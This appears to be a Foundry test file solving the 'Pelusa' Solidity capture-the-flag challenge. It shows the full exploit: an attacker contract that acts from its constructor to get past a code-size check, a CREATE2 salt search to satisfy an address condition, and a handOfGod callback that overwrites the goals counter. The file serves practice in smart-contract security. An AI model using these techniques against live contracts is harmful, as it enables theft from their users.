// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Pelusa, IGame} from "../src/Pelusa.sol";

contract Attacker is IGame {
    address private immutable owner;
    address internal player;
    uint256 public goals;
    Pelusa private immutable target;

    constructor(Pelusa _target) {
        target = _target;
        owner = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(msg.sender, blockhash(block.number))
                    )
                )
            )
        );

        _target.passTheBall();
    }

    function shoot() external {
        target.shoot();
    }

    function getBallPossesion() external view override returns (address) {
        return owner;
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}

contract PelusaTest is Test {
    address hacker = makeAddr("hacker");
    Pelusa private challenge;

    function setUp() external {
        challenge = new Pelusa();
    }

    function getBytecode() internal view returns (bytes memory) {
        return
            abi.encodePacked(
                type(Attacker).creationCode,
                abi.encode(challenge)
            );
    }

    function getSalt(bytes memory bytecode) internal view returns (uint256) {
        uint256 salt;
        address attackerAddress;
        while (true) {
            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    hacker,
                    salt,
                    keccak256(bytecode)
                )
            );
            attackerAddress = address(uint160(uint256(hash)));
            if (uint256(uint160(attackerAddress)) % 100 == 10) {
                return salt;
            }
            ++salt;
        }
    }

    function test_hack() external {
        /**
          Objective of CTF:
          * Score from 1 to 2 goals for a win.
         */
        vm.startPrank(hacker, hacker);
        bytes memory bytecode = getBytecode();
        uint256 salt = getSalt(bytecode);
        address attackerAddress;
        assembly {
            attackerAddress := create2(
                callvalue(), // wei sent with current call
                // Actual code starts after skipping the first 32 bytes
                add(bytecode, 0x20),
                mload(bytecode), // Load the size of code contained in the first 32 bytes
                salt // Salt from function arguments
            )

            if iszero(extcodesize(attackerAddress)) {
                revert(0, 0)
            }
        }
        Attacker attacker = Attacker(attackerAddress);
        attacker.shoot();
        vm.stopPrank();

        assertEq(challenge.goals(), 2);
    }
}
